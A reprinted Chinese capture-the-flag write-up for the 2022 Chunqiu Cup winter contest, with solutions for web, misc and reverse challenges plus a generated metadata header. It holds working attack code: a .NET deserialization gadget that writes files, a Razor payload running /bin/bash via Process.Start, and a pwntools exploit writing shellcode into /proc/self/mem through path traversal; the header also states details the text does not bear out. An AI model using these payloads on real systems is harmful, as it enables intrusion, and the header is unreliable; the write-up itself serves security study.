---
title: 2022 春秋杯冬季赛 WriteUp By EDISEC
contest: 2022 春秋杯冬季赛
year: 2022
difficulty: medium
vuln_type:
- rce
- web_unknown
- ret2libc
- reverse
- crypto_oracle
tags:
- .NET
- ComparerData
- ASP.NET-Razor
- File.WriteAllText
- Process.Start
- /proc/self/mem
- DCT
- FCT
- bit-rotate
- Go-reflect
- 春秋杯
attack_chain:
- 'Web ezdoenot: .NET ComparerData<T> 反射 + SerTools.Serialize gadget → File.WriteAllText 写文件'
- 'Web ezphp: ?num=1||1 注入'
- 'Misc 楠之勇者: getmoney 10 次 → buy 1 个记事录 → writeevil ../proc/self/mem +0x600000 shellcode'
- 'Re baby_transform: 42 个 8 字节 (float) → DCT 逆变换 (an,bn 计算) → flag{e320d3aa-...}'
- 'Re easy_python: flag[i] = (flag[i] >> 5) | ((flag[i] << 3) & 255) 位旋转 → flag{ddbae889-...}'
- 'Re godeep: IDA 反射 + 函数解析 Go 二进制'
key_payload: DCT 逆变换 an = sum(val[x][1] * cos(-2πxn/N)) / N
one_liner: 春秋杯 2022 冬季赛 6 大题：.NET + ASP.NET Razor + Python game + DCT + 位旋转 + Go
lesson: .NET Gadget 链 + ASP.NET Razor 反射是高级 web；/proc/self/mem 写 shellcode 是经典 Linux pwn；DCT 逆变换是 reverse 入门
quality: high
full_path: 20222022年春秋杯冬季赛-WriteUp_By_EDISEC.full.md
meta_path: 20222022年春秋杯冬季赛-WriteUp_By_EDISEC.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: '2022 春秋杯冬季赛 WriteUp By EDISEC。春秋杯 2022 冬季赛 6 大题：.NET + ASP.NET Razor + Python game + DCT + 位旋转 + Go。关键路径：Web ezdoenot: .NET ComparerData<T> 反射 + SerTools.Serialize gadget → File.WriteAllText 写文件 → ...'
category: web
subcategory: rce
subcategories:
- rce
- web_other
- stack_overflow
- reverse
- oracle
tools_used:
- Go
- IDA
- Python
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/88092.html
reasoning_chain:
- '[触发点] ezdoenot 是 .NET ComparerData<T> 反射 + SerTools.Serialize → 假设：找 gadget 链 → [动作] ysoserial.net + ComparerData gadget → File.WriteAllText / [观察] 写文件成功 / [下一步] ezphp'
- '[触发点] ?num=1||1 → 假设：参数注入 → [动作] 拼 || → [观察] 触发执行 / [下一步] 楠之勇者'
- '[触发点] getmoney 10 次 → buy 记事录 → writeevil ../proc/self/mem+0x600000 → 假设：写 shellcode → [动作] 写 msfvenom shellcode / [观察] 反弹 / [下一步] baby_transform'
- '[触发点] 42 个 8 字节 (float) → 假设：DCT 逆变换 → [动作] 写 an = sum(val[x][1]*cos(-2πxn/N))/N / [下一步] 位旋转'
- '[触发点] flag[i] = (flag[i]>>5)|((flag[i]<<3)&255) → 假设：位旋转逆向 / [动作] 反向旋转 / [观察] flag{ddbae889-...} / [下一步] godeep'
- '[触发点] IDA 看 Go 反射函数表 → 假设：反射 + 函数指针解析 → [动作] IDA 跟踪 mainModule 反射'
failed_attempts:
- 试图用 ysoserial 通用链 → 失败：.NET ComparerData 反射需定制 gadget
- 试图直接 call system → 失败：game 不让调外部命令
key_observations:
- .NET Gadget 链 + ASP.NET Razor 反射是高级 web
- /proc/self/mem 写 shellcode 是经典 Linux pwn
- DCT 逆变换是 reverse 入门
- Go 二进制反射函数解析要跟 funcval 表
prerequisites:
- .NET 反序列化 gadget 构造
- ASP.NET Razor 反射机制
- DCT 离散余弦变换
- Go 函数反射 + funcval 解析
---
# 20222022年春秋杯冬季赛-WriteUp By EDISEC

> 原文: https://www.ctfiot.com/88092.html
> ID: 88092

EDI

JOIN US ▶▶▶

招新

EDI安全的CTF战队经常参与各大CTF比赛，了解CTF赛事。

欢迎各位师傅加入EDI，大家一起打CTF，一起进步。（诚招re crypto pwn misc方向的师傅）有意向的师傅请联系邮箱shiyi@edisec.net（带上自己的简历，简历内容包括但不限于就读学校、个人ID、擅长技术方向、历史参与比赛成绩等等。

点击蓝字 ·  关注我们

01

Web（题解：@SNCKER）

1

ezdoenot

!this.key.Equals(ComparerData<T>.key)this.key

static void Main(string[] args){ ComparerData<string> comparerDataObj = new ComparerData<string>(); string tpl = File.ReadAllText(@"staticerror.html"); Gadget<string> gadgetObj = new Gadget<string>(comparerDataObj, "static/error.html", tpl); Type gadgetType = gadgetObj.GetType(); FieldInfo keyFiled = gadgetType.GetField("key", BindingFlags.Instance | BindingFlags.NonPublic); keyFiled.SetValue(gadgetObj, "c482f17d0ab14fdc9752b28f36ff2020"); Type comparerDataType = comparerDataObj.GetType(); FieldInfo isVoidField = comparerDataType.GetField("isVoid", BindingFlags.Instance | BindingFlags.NonPublic); isVoidField.SetValue(comparerDataObj, true); Type innerClassMethodType = comparerDataType.GetNestedTypes(BindingFlags.NonPublic)[0]; innerClassMethodType = innerClassMethodType.MakeGenericType(typeof(string)); Console.WriteLine(innerClassMethodType.FullName); FieldInfo classnameFiled = innerClassMethodType.GetField("Classname", BindingFlags.Instance | BindingFlags.NonPublic); FieldInfo methodnameFiled = innerClassMethodType.GetField("Methodname", BindingFlags.Instance | BindingFlags.NonPublic); Object innerClassMethodObj = Activator.CreateInstance(innerClassMethodType); classnameFiled.SetValue(innerClassMethodObj, "System.IO.File"); methodnameFiled.SetValue(innerClassMethodObj, "WriteAllText"); FieldInfo cFiled = comparerDataType.GetField("c", BindingFlags.Instance | BindingFlags.NonPublic); cFiled.SetValue(comparerDataObj, innerClassMethodObj); Console.WriteLine(SerTools.Serialize(gadgetObj));}

@using System.Reflection;@{Assembly assembly = Assembly.Load("System.Diagnostics.Process");var processType = assembly.GetType("System.Diagnostics.Process");var startMethod = processType.GetMethod("Start", BindingFlags.Static | BindingFlags.Public, null, new Type[]{typeof(string),typeof(string)}, null);startMethod.Invoke(null, new []{"/bin/bash", "/app/wwwroot/js/1.sh"});@processType.FullName;}

2

ezphp

?num=1||1

02

Misc（题解：@Mrsh）

1

nan’s analysis

2

reindeer game

3

楠之勇者

from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')io = remote("39.106.48.123",27713)io.sendlineafter("请告诉我你的姓名：","Mrsh")io.sendlineafter(">>","1")
# Linux-4.19.91-20220519040629.182dd72.al7.x86_64-x86_64-with-Ubuntu-18.04-bionic
# Python 3.6.9
def getmoney(n): for i in range(n): io.sendlineafter(">>","4") io.sendlineafter("（按Enter键继续）","n")
def buy(n): io.sendlineafter(">>","3") io.sendlineafter(">>",str(n)) io.sendlineafter(">>",'a') io.sendlineafter("（按Enter键继续）","n")
def writeevil(file,offset,data): io.sendlineafter(">>","2") io.sendlineafter(">>","1") io.sendlineafter("输入你的记事录名称：",file) io.sendlineafter("从第几页开始记录：",str(offset)) io.sendlineafter("（魔杖附效）输入内容：",base64.b64encode(data)) #io.sendlineafter("按Enter","n")
getmoney(10)buy(1)sh=asm(shellcraft.amd64.linux.sh())writeevil("../proc/self/mem",0x600000,sh.rjust(0x1000,b"x90"))
io.interactive()

03

Re（题解：tlsn、神奇）

1

baby_transform

import structfp = open(r"C:
UsersAdministratorDesktop春秋杯冬季赛baby_transform_566a4f87c687b0c077804d89282566caflag.enc","rb")data = fp.read()val = []def hex_to_float(I): f = struct.unpack('<d',I)    return f[0]for i in range(0,84,2): t1 = hex_to_float(data[i*8:i*8+8]) t2 = hex_to_float(data[i*8+8:i*8+16])    val.append((t1,t2))import math
from struct import *PAI = 3.141592653589793N = 42bbb = b""for n in range(42): an = bn = 0 for x in range(42): an += val[x][1] * math.cos(-2*PAI*x*n / N) bn += val[x][0] * math.sin(-2*PAI*x*n / N) an *= (1 / N)    bn *= (1 / N)        print(chr(int(an-bn+0.5)),end = "")

得到 :f}c3a26829fa7f-080b-1ab4-0fb7-aa3d023e{gal

取反，得到flag为:
flag{e320d3aa-7bf0-4ba1-b080-f7af92862a3c}

2

easy_python

flag = [204, 141, 44, 236, 111, 140, 140, 76, 44, 172, 7, 7, 39, 165, 70, 7, 39, 166, 165, 134, 134, 140, 204, 165, 7, 39, 230, 140, 165, 70, 44, 172, 102, 6, 140, 204, 230, 230, 76, 198, 38, 175]

for i in range(42): flag[i] = (flag[i] >> 5) | ((flag[i] << 3) & 255)  print(chr(flag[i]),end = "")flag为：flag{ddbae889-2895-44df-897d-2ae30df77b61}

3

godeep(一解)

# import idaapi
# import idautils
# def Ida_Decode(fp,begin,end):# All_Fun = list(idautils.Functions(begin,end)) # for i in range(len(All_Fun)):# func = idaapi.get_func(All_Fun[i]) # 获取函数
# cfunc = idaapi.decompile(func.start_ea) # 反编译 #         fp.write((str(cfunc)))
# begin = 0x000000000C8B820
# end = 0x000000000D72EE6
# addr = begin
# with open(r"C:
UsersAdministratorDesktopGet_Code","w") as fp:#     Ida_Decode(fp,begin,end)
# import re
# patternn = re.compile("__fastcall (godeep_tree_[a-zA-Z0-9]+)(")
# fp = open(r"C:
UsersAdministratorDesktopGet_Code","r")
# All_data = fp.readlines()
# find_str = "godeep_tree_VSWEwsr_successssssssssssssssssssss"# idx = 0
# flag_2 = ""# while 1:# if find_str == "godeep_tree_ApSzXJOjiFA" :# break;
# for i in range(len(All_data)):# if find_str in All_data[i] and "__fastcall" not in All_data[i]:# idx = i
# if "else" in All_data[i+1]:# flag_2 += "1"# else:# flag_2 += "0" # # print(flag_2)
# ans = 0
# for i in range(idx-1,-1,-1):# if "__fastcall" in All_data[i] :# fun_name = patternn.search(All_data[i]).group(1)
# ans = 1
# break
# if ans == 0:# assert 0
#     find_str = fun_name[:] # print(flag_2)re_flag = "100001100000110001000110110011000010011010101100001011001110110011000110010001100001110011101100101101001110110000011100100111000001110010110100011001101001110010001100001011001011010001000110111011000110011001100110101101001110110010011100001001100100011011001100000011001100011001100110"flag = hex(int((re_flag[::-1]),2))[2:]print(bytes.fromhex(flag))

flag为:
fc03bd97-ff7b-419f-8987-78bc745d3b0a

4

godeep（二解）

Ⅰ、程序信息

Ⅱ、功能探测

1.运行程序看一下程序如何验证我们的flag的，发现它给了我们一个提示，如果输入正确则提示 right ，否则提示 wrong

1.我们使用Detect工具看一下程序的编译器信息，发现是用Go语言进行编写的64位程序

在使用ida7.7分析main函数的时候像 fmt_Fprintln，fmt_Fscanf、main_convert 等这些被调用 的函数，他们的参数都是不完整的

需要自己在函数上按Y给它们添加参数，具体怎么添加请继续往下看

__int64 __fastcall fmt_Fprintln(void *, void *, void *, char *, void *)

2.fmt_Fscanf函数也与 fmt_Fprintln 做同样的操作

__int64 __fastcall fmt_Fscanf(__int64, __int64, __int64, __int64, __int64,__int64)

__int64 __fastcall main_convert(__int64, void *)

__int64 __fastcall godeep_tree_ApSzXJOjiFA(__int64, __int64)

1.设置ida的本地Windows调试选项

from idaapi import *''' 功能：获取一个函数的上层调用函数地址 返回：函数的上层调用地址'''def get_crefs(func): find_func = func addr = list(CodeRefsTo(find_func,0))[0] up_call = get_func(addr).start_ea return up_call''' 功能：获取godeep_tree.ApSzXJOjiFA到godeep_tree.VSWEwsr之间的所有函数上层调用 返回：这两个函数之间的调用列表'''def get_all_refs(): start_func = get_name_ea(0,'godeep_tree.VSWEwsr') end_func = get_name_ea(0,'godeep_tree.ApSzXJOjiFA') func_list = [start_func] while True: ret = get_crefs(start_func) func_list.append(ret) start_func = ret if ret == end_func: break return func_listrefs = get_all_refs()print(refs)print(get_func_name(refs[0]))print(get_func_name(refs[-1]))

from idaapi import *''' 功能：获取一个函数的上层调用函数地址 返回：函数的上层调用地址'''def get_crefs(func): find_func = func addr = list(CodeRefsTo(find_func,0))[0] up_call = get_func(addr).start_ea return up_call''' 功能：获取godeep_tree.ApSzXJOjiFA到godeep_tree.VSWEwsr之间的所有函数上层调用 返回：这两个函数之间的调用列表'''def get_all_refs(): start_func = get_name_ea(0,'godeep_tree.VSWEwsr') end_func = get_name_ea(0,'godeep_tree.ApSzXJOjiFA') func_list = [start_func] while True: ret = get_crefs(start_func) func_list.append(ret) start_func = ret if ret == end_func: break return func_list''' 功能：根据相邻两个调用函数来判断返回1还是返回0 参数: cur_func: 当前函数地址 up_func：cur_func的上层调用函数地址'''def get_bin_code(cur_func,up_func): # 1.这里要将函数名中的.替换成_ cur_name = get_func_name(cur_func).replace('.','_') # 2. # 目的是为了在up_func函数中可以匹配到对应的行,因为反编译函数里面它的写法全是_ # 这里将反编译的伪代码,使用n进分割 up_body = str(decompile(up_func)).split('n') for i in range(len(up_body)): # 如果cur_name在上层函数体中的这一行内 if cur_name in up_body[i]: # 判断下方有没有else,有就返回1,否则返回0 if 'else' in up_body[i+1]: return '1'           else: return '0'# 1.首先获取end到start的所有函数引用refs = get_all_refs()print(len(refs))
# 2.遍历这些函数引用bin_code = ''for i in range(0,len(refs)-1): # 3.传递get_bin_code所需要的参数 # cur_func : refs[i] # up_func : refs[i+1] bin_code += get_bin_code(refs[i],refs[i+1])print(bin_code)
# 4.因为是从后往前找到的所以要将结果反转过来,并转成16进制flag = hex(int((bin_code[::-1]),2))[2:]# 5.将16进制转成字节并解码得到flagflag = bytes.fromhex(flag).decode()print(flag)

EDI安全

扫二维码｜关注我们

一个专注渗透实战经验分享的公众号


```
!this.key.Equals(ComparerData<T>.key)this.key
static void Main(string[] args){ ComparerData<string> comparerDataObj = new ComparerData<string>(); string tpl = File.ReadAllText(@"staticerror.html"); Gadget<string> gadgetObj = new Gadget<string>(comparerDataObj, "static/error.html", tpl); Type gadgetType = gadgetObj.GetType(); FieldInfo keyFiled = gadgetType.GetField("key", BindingFlags.Instance | BindingFlags.NonPublic); keyFiled.SetValue(gadgetObj, "c482f17d0ab14fdc9752b28f36ff2020"); Type comparerDataType = comparerDataObj.GetType(); FieldInfo isVoidField = comparerDataType.GetField("isVoid", BindingFlags.Instance | BindingFlags.NonPublic); isVoidField.SetValue(comparerDataObj, true); Type innerClassMethodType = comparerDataType.GetNestedTypes(BindingFlags.NonPublic)[0]; innerClassMethodType = innerClassMethodType.MakeGenericType(typeof(string)); Console.WriteLine(innerClassMethodType.FullName); FieldInfo classnameFiled = innerClassMethodType.GetField("Classname", BindingFlags.Instance | BindingFlags.NonPublic); FieldInfo methodnameFiled = innerClassMethodType.GetField("Methodname", BindingFlags.Instance | BindingFlags.NonPublic); Object innerClassMethodObj = Activator.CreateInstance(innerClassMethodType); classnameFiled.SetValue(innerClassMethodObj, "System.IO.File"); methodnameFiled.SetValue(innerClassMethodObj, "WriteAllText"); FieldInfo cFiled = comparerDataType.GetField("c", BindingFlags.Instance | BindingFlags.NonPublic); cFiled.SetValue(comparerDataObj, innerClassMethodObj); Console.WriteLine(SerTools.Serialize(gadgetObj));}
@using System.Reflection;@{Assembly assembly = Assembly.Load("System.Diagnostics.Process");var processType = assembly.GetType("System.Diagnostics.Process");var startMethod = processType.GetMethod("Start", BindingFlags.Static | BindingFlags.Public, null, new Type[]{typeof(string),typeof(string)}, null);startMethod.Invoke(null, new []{"/bin/bash", "/app/wwwroot/js/1.sh"});@processType.FullName;}
from pwn import *context.log_level = 'debug'context(arch='amd64', os='linux')io = remote("39.106.48.123",27713)io.sendlineafter("请告诉我你的姓名：","Mrsh")io.sendlineafter(">>","1")
# Linux-4.19.91-20220519040629.182dd72.al7.x86_64-x86_64-with-Ubuntu-18.04-bionic
# Python 3.6.9
def getmoney(n): for i in range(n): io.sendlineafter(">>","4") io.sendlineafter("（按Enter键继续）","n")
def buy(n): io.sendlineafter(">>","3") io.sendlineafter(">>",str(n)) io.sendlineafter(">>",'a') io.sendlineafter("（按Enter键继续）","n")
def writeevil(file,offset,data): io.sendlineafter(">>","2") io.sendlineafter(">>","1") io.sendlineafter("输入你的记事录名称：",file) io.sendlineafter("从第几页开始记录：",str(offset)) io.sendlineafter("（魔杖附效）输入内容：",base64.b64encode(data)) #io.sendlineafter("按Enter","n")
getmoney(10)buy(1)sh=asm(shellcraft.amd64.linux.sh())writeevil("../proc/self/mem",0x600000,sh.rjust(0x1000,b"x90"))
io.interactive()
import structfp = open(r"C:
UsersAdministratorDesktop春秋杯冬季赛baby_transform_566a4f87c687b0c077804d89282566caflag.enc","rb")data = fp.read()val = []def hex_to_float(I): f = struct.unpack('<d',I)    return f[0]for i in range(0,84,2): t1 = hex_to_float(data[i*8:i*8+8]) t2 = hex_to_float(data[i*8+8:i*8+16])    val.append((t1,t2))import math
from struct import *PAI = 3.141592653589793N = 42bbb = b""for n in range(42): an = bn = 0 for x in range(42): an += val[x][1] * math.cos(-2*PAI*x*n / N) bn += val[x][0] * math.sin(-2*PAI*x*n / N) an *= (1 / N)    bn *= (1 / N)        print(chr(int(an-bn+0.5)),end = "")
得到 :f}c3a26829fa7f-080b-1ab4-0fb7-aa3d023e{gal
取反，得到flag为:
flag{e320d3aa-7bf0-4ba1-b080-f7af92862a3c}
flag = [204, 141, 44, 236, 111, 140, 140, 76, 44, 172, 7, 7, 39, 165, 70, 7, 39, 166, 165, 134, 134, 140, 204, 165, 7, 39, 230, 140, 165, 70, 44, 172, 102, 6, 140, 204, 230, 230, 76, 198, 38, 175]
for i in range(42): flag[i] = (flag[i] >> 5) | ((flag[i] << 3) & 255)  print(chr(flag[i]),end = "")flag为：flag{ddbae889-2895-44df-897d-2ae30df77b61}
# import idaapi
# import idautils
# def Ida_Decode(fp,begin,end):# All_Fun = list(idautils.Functions(begin,end)) # for i in range(len(All_Fun)):# func = idaapi.get_func(All_Fun[i]) # 获取函数
# cfunc = idaapi.decompile(func.start_ea) # 反编译 #         fp.write((str(cfunc)))
# begin = 0x000000000C8B820
# end = 0x000000000D72EE6
# addr = begin
# with open(r"C:
UsersAdministratorDesktopGet_Code","w") as fp:#     Ida_Decode(fp,begin,end)
# import re
# patternn = re.compile("__fastcall (godeep_tree_[a-zA-Z0-9]+)(")
# fp = open(r"C:
UsersAdministratorDesktopGet_Code","r")
# All_data = fp.readlines()
# find_str = "godeep_tree_VSWEwsr_successssssssssssssssssssss"# idx = 0
# flag_2 = ""# while 1:# if find_str == "godeep_tree_ApSzXJOjiFA" :# break;
# for i in range(len(All_data)):# if find_str in All_data[i] and "__fastcall" not in All_data[i]:# idx = i
# if "else" in All_data[i+1]:# flag_2 += "1"# else:# flag_2 += "0" # # print(flag_2)
# ans = 0
# for i in range(idx-1,-1,-1):# if "__fastcall" in All_data[i] :# fun_name = patternn.search(All_data[i]).group(1)
# ans = 1
# break
# if ans == 0:# assert 0
#     find_str = fun_name[:] # print(flag_2)re_flag = "100001100000110001000110110011000010011010101100001011001110110011000110010001100001110011101100101101001110110000011100100111000001110010110100011001101001110010001100001011001011010001000110111011000110011001100110101101001110110010011100001001100100011011001100000011001100011001100110"flag = hex(int((re_flag[::-1]),2))[2:]print(bytes.fromhex(flag))
flag为:
fc03bd97-ff7b-419f-8987-78bc745d3b0a
__int64 __fastcall fmt_Fprintln(void *, void *, void *, char *, void *)
__int64 __fastcall fmt_Fscanf(__int64, __int64, __int64, __int64, __int64,__int64)
__int64 __fastcall main_convert(__int64, void *)
__int64 __fastcall godeep_tree_ApSzXJOjiFA(__int64, __int64)
from idaapi import *''' 功能：获取一个函数的上层调用函数地址 返回：函数的上层调用地址'''def get_crefs(func): find_func = func addr = list(CodeRefsTo(find_func,0))[0] up_call = get_func(addr).start_ea return up_call''' 功能：获取godeep_tree.ApSzXJOjiFA到godeep_tree.VSWEwsr之间的所有函数上层调用 返回：这两个函数之间的调用列表'''def get_all_refs(): start_func = get_name_ea(0,'godeep_tree.VSWEwsr') end_func = get_name_ea(0,'godeep_tree.ApSzXJOjiFA') func_list = [start_func] while True: ret = get_crefs(start_func) func_list.append(ret) start_func = ret if ret == end_func: break return func_listrefs = get_all_refs()print(refs)print(get_func_name(refs[0]))print(get_func_name(refs[-1]))
from idaapi import *''' 功能：获取一个函数的上层调用函数地址 返回：函数的上层调用地址'''def get_crefs(func): find_func = func addr = list(CodeRefsTo(find_func,0))[0] up_call = get_func(addr).start_ea return up_call''' 功能：获取godeep_tree.ApSzXJOjiFA到godeep_tree.VSWEwsr之间的所有函数上层调用 返回：这两个函数之间的调用列表'''def get_all_refs(): start_func = get_name_ea(0,'godeep_tree.VSWEwsr') end_func = get_name_ea(0,'godeep_tree.ApSzXJOjiFA') func_list = [start_func] while True: ret = get_crefs(start_func) func_list.append(ret) start_func = ret if ret == end_func: break return func_list''' 功能：根据相邻两个调用函数来判断返回1还是返回0 参数: cur_func: 当前函数地址 up_func：cur_func的上层调用函数地址'''def get_bin_code(cur_func,up_func): # 1.这里要将函数名中的.替换成_ cur_name = get_func_name(cur_func).replace('.','_') # 2. # 目的是为了在up_func函数中可以匹配到对应的行,因为反编译函数里面它的写法全是_ # 这里将反编译的伪代码,使用n进分割 up_body = str(decompile(up_func)).split('n') for i in range(len(up_body)): # 如果cur_name在上层函数体中的这一行内 if cur_name in up_body[i]: # 判断下方有没有else,有就返回1,否则返回0 if 'else' in up_body[i+1]: return '1'           else: return '0'# 1.首先获取end到start的所有函数引用refs = get_all_refs()print(len(refs))
# 2.遍历这些函数引用bin_code = ''for i in range(0,len(refs)-1): # 3.传递get_bin_code所需要的参数 # cur_func : refs[i] # up_func : refs[i+1] bin_code += get_bin_code(refs[i],refs[i+1])print(bin_code)
# 4.因为是从后往前找到的所以要将结果反转过来,并转成16进制flag = hex(int((bin_code[::-1]),2))[2:]# 5.将16进制转成字节并解码得到flagflag = bytes.fromhex(flag).decode()print(flag)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]